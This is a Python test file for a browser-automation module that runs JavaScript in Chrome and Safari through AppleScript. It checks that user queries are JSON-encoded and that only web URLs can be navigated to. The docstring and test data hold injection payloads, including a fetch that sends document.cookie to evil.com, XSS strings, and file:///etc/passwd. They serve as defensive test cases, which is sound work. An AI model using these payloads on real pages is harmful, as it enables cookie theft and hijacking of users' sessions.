"""Driving the page rather than the pixels.

Verified from the apps' own `sdef` on 2026-08-15, not assumed:

    Chrome:  execute tab N javascript "…"     → runs JS, returns a result
             URL property of tab              → settable
    Safari:  do JavaScript … in document 1

and live: `osascript -e 'tell application "Google Chrome" to execute front
window's active tab javascript "1+1"'` returned **2** on this machine.

That means real page control with no accessibility tree, no screenshot
parsing and no synthesised clicks — deterministic and fast.

**The injection rule is the same one AppleScript gets, for the same reason.**
A search query is a transcript. Concatenating it into JavaScript is how
`search for "); fetch("evil.com?c="+document.cookie); ("` becomes code rather
than a search. Arguments are JSON-encoded and passed into a fixed function
body; nothing user-supplied is ever spliced into source.
"""

import json

import pytest

from kavach.hands.browser import Browser, build_js, search_url


# ═══ the injection rule ═══

HOSTILE = [
    '"); fetch("//evil.com?c="+document.cookie); ("',
    "'); alert('pwned'); ('",
    '</script><script>alert(1)</script>',
    '\\"; window.location="//evil.com"; //',
]


@pytest.mark.parametrize("hostile", HOSTILE)
def test_arguments_are_encoded_never_concatenated(hostile):
    """The payload must appear exactly once, as a JSON string literal, and
    nowhere else. If it appears outside its own encoding, it is code."""
    js = build_js("search", {"query": hostile})
    encoded = json.dumps(hostile)

    assert encoded in js, "the argument was not JSON-encoded"
    # Remove the one legitimate occurrence; nothing recognisable may remain.
    assert hostile not in js.replace(encoded, ""), "the raw argument leaked"


@pytest.mark.parametrize("hostile", HOSTILE)
def test_a_hostile_query_still_produces_a_valid_search_url(hostile):
    """It should search for the weird string, not execute it."""
    url = search_url(hostile)
    assert url.startswith("https://")
    assert "\n" not in url and '"' not in url


# ═══ what may be navigated to ═══

@pytest.mark.parametrize("bad", [
    "javascript:alert(1)",
    "JavaScript:alert(1)",
    "file:///etc/passwd",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "about:config",
])
def test_only_http_urls_may_be_navigated_to(bad):
    """`javascript:` and `file:` turn a navigate into an execute, and a
    read-of-any-file, respectively. A scheme allowlist, not a blocklist."""
    with pytest.raises(ValueError):
        Browser("Google Chrome").navigate(bad)


@pytest.mark.parametrize("good", [
    "https://youtube.com",
    "http://localhost:3000/page?q=1",
])
def test_ordinary_web_urls_are_fine(good):
    browser = Browser("Google Chrome", runner=lambda script: _Ok())
    assert browser.navigate(good) is not None


# ═══ which browsers ═══

def test_an_app_that_is_not_a_browser_is_refused():
    with pytest.raises(ValueError):
        Browser("Notes")


def test_an_uninstalled_browser_is_refused():
    with pytest.raises(ValueError):
        Browser("NetscapeNavigator")


def test_chrome_and_safari_use_their_own_dialects():
    """Chrome's `execute … javascript` and Safari's `do JavaScript … in
    document 1` are different commands; neither app understands the other's."""
    scripts = []

    def runner(script):
        scripts.append(script)
        return _Ok()

    Browser("Google Chrome", runner=runner).js("1+1")
    Browser("Safari", runner=runner).js("1+1")

    assert "execute" in scripts[0] and "javascript" in scripts[0]
    assert "do JavaScript" in scripts[1]


# ═══ the fallback that needs no permission ═══

def test_search_falls_back_to_setting_the_url_when_js_is_unavailable():
    """`Allow JavaScript from Apple Events` is a manual toggle in both
    browsers. Until it is on, `execute` fails — and "open Chrome and search
    YouTube" must still work, because setting a tab's URL needs no toggle."""
    calls = []

    def runner(script):
        calls.append(script)
        if "javascript" in script.lower():
            return _Fail("Executing JavaScript through AppleScript is turned off")
        return _Ok()

    browser = Browser("Google Chrome", runner=runner)
    result = browser.search("kavach voice assistant")

    assert result.ok, "search gave up instead of falling back to a URL"
    assert any("URL" in c for c in calls), "it never tried the URL route"


def test_the_search_url_is_a_real_search():
    assert "youtube" in search_url("youtube").lower()
    url = search_url("hello world")
    assert "hello" in url and " " not in url


# ═══ helpers ═══

class _Ok:
    ok = True
    out = ""
    err = ""


class _Fail:
    ok = False
    out = ""

    def __init__(self, err=""):
        self.err = err
